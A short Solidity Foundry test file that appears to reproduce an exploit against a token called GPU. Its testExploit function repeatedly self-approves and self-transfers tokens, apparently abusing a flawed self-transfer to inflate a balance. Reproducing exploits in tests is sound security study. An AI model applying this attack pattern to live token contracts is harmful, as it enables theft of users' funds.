// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {GPUBaseTest} from "./GPUBase.t.sol";

contract GPUTest is GPUBaseTest {
    function testExploit() external validation {
        for (uint256 i = 0; i < 10; i++) {
            token.approve(address(this), 1 ether);
            token.transferFrom(address(this), address(this), 1 ether);
        }
    }
}
